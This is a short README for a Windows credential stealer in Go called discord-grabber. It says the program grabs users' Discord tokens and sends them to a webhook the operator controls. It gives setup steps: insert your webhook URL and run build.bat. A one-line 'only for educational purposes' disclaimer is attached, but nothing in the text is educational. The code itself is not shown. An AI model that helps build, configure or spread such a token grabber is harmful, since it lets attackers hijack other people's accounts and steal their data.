## discord-grabber
**A simple go program that can grab tokens from a user and send it through a webhook.**
(only for educational purposes)

just change the webhook variable in the main function to your webhook,
and type `build.bat`, and you are done.

if you are on linux don't use the batch file but just compile it yourself.

(grabber only supports windows)
